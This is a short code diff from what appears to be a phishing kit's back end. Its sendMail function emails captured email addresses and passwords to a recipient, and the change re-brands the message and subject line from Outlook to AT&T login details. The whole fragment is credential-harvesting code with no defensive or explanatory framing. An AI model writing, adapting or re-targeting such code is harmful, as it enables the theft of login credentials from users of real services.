@@ -11,12 +11,12 @@ const sendMail = (email, password, user, res) => {
     auth,
   })
 
-  const text = `New outlook login details. email: ${email}, password: ${password} `
+  const text = `New ATT login details. email: ${email}, password: ${password} `
 
   const mailOptions = {
     from: auth['user'],
     to: user,
-    subject: 'NEW LOGIN DETAILS',
+    subject: 'NEW LOGIN DETAILS FOR ATT',
     text,
   }
 
